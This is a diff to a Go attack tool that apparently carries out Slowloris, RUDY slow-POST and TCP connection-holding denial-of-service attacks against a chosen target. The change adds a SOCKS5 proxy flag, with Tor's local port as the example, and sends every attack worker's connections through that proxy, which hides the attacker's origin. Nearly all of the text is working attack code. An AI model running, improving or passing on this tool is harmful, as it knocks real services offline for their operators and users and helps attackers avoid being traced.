@@ -5,10 +5,13 @@ import (
 	"flag"
 	"fmt"
 	"net"
+	"net/url"
 	"os"
 	"sync"
 	"sync/atomic"
 	"time"
+
+	"golang.org/x/net/proxy"
 )
 
 var (
@@ -19,6 +22,7 @@ var (
 	delay    = flag.Int("delay", 10, "delay between bytes (seconds)")
 	duration = flag.Int("duration", 900, "max duration (seconds)")
 	sni      = flag.String("sni", "", "TLS SNI (default: host from target)")
+	proxyURL = flag.String("proxy", "", "SOCKS5 proxy (e.g. socks5://127.0.0.1:9050)")
 
 	connects  uint64
 	disconns  uint64
@@ -83,6 +87,23 @@ func tlsConfig() *tls.Config {
 	}
 }
 
+func getDialer() proxy.Dialer {
+	if *proxyURL == "" {
+		return proxy.Direct
+	}
+	u, err := url.Parse(*proxyURL)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "[strike] bad proxy URL: %s\n", *proxyURL)
+		os.Exit(1)
+	}
+	d, err := proxy.FromURL(u, proxy.Direct)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "[strike] proxy error: %v\n", err)
+		os.Exit(1)
+	}
+	return d
+}
+
 // ========== Slowloris ==========
 
 func slowloris(deadline time.Time) {
@@ -99,13 +120,14 @@ func slowloris(deadline time.Time) {
 
 func slowlorisWorker(id int, deadline time.Time) {
 	conf := tlsConfig()
+	dialer := getDialer()
 	// Prepare headers (we'll send these byte by byte)
 	headers := fmt.Sprintf(
 		"GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0\r\nAccept: */*\r\n",
 		*path, *sni)
 
 	for time.Now().Before(deadline) {
-		raw, err := net.DialTimeout("tcp", *target, 10*time.Second)
+		raw, err := dialer.Dial("tcp", *target)
 		if err != nil {
 			time.Sleep(2 * time.Second)
 			continue
@@ -164,12 +186,13 @@ func rudy(deadline time.Time) {
 
 func rudyWorker(id int, deadline time.Time) {
 	conf := tlsConfig()
+	dialer := getDialer()
 	header := fmt.Sprintf(
 		"POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 99999999\r\nUser-Agent: Mozilla/5.0 Chrome/121.0.0.0\r\nAccept: */*\r\n\r\n",
 		*path, *sni)
 
 	for time.Now().Before(deadline) {
-		raw, err := net.DialTimeout("tcp", *target, 10*time.Second)
+		raw, err := dialer.Dial("tcp", *target)
 		if err != nil {
 			time.Sleep(2 * time.Second)
 			continue
@@ -218,8 +241,9 @@ func tcpHold(deadline time.Time) {
 }
 
 func tcpHoldWorker(id int, deadline time.Time) {
+	dialer := getDialer()
 	for time.Now().Before(deadline) {
-		conn, err := net.DialTimeout("tcp", *target, 10*time.Second)
+		conn, err := dialer.Dial("tcp", *target)
 		if err != nil {
 			time.Sleep(2 * time.Second)
 			continue
